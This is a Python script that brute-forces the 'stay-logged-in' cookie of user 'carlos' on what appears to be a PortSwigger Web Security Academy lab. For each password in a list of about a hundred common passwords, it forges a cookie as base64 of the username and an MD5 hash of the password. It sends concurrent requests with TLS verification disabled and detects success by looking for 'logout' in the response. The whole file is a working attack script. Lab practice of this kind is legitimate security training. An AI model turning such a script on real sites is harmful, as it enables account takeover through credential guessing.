import asyncio
import aiohttp
import base64
from hashlib import md5
import time
import sys
import ssl

# Disable SSL verification warnings
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

url = 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/my-account?id=carlos'
proxy = 'http://127.0.0.1:8080'

candidates = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", 
"123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", 
"123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", 
"qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", 
"soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", 
"thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", 
"jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", 
"159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", 
"chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", 
"matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Referer': 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/'
}

found = asyncio.Event()

async def attempt_password(sem, session, password, counter):
    async with sem:
        if found.is_set():
            return
        sys.stdout.write(f'\rAttempt number: {counter}')
        sys.stdout.flush()

        cookie_val = base64.b64encode(f'carlos:{md5(password.encode()).hexdigest()}'.encode('ascii')).decode()
        cookies = {'stay-logged-in': cookie_val}

        try:
            async with session.get(url, headers=headers, cookies=cookies, ssl=ssl_context) as r:
                text = await r.text()
                if 'logout' in text:
                    found.set()
                    print(f'\n[+] Found password: {password}')
        except Exception as e:
            print(f'\n[-] Error: {e}')

async def main():
    before = time.time()
    sem = asyncio.Semaphore(10)
    connector = aiohttp.TCPConnector(ssl=ssl_context)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            attempt_password(sem, session, pwd, i+1)
            for i, pwd in enumerate(candidates)
        ]
        await asyncio.gather(*tasks)
    print(f'\nElapsed time: {time.time() - before:.2f}s')

if __name__ == "__main__":
    asyncio.run(main())
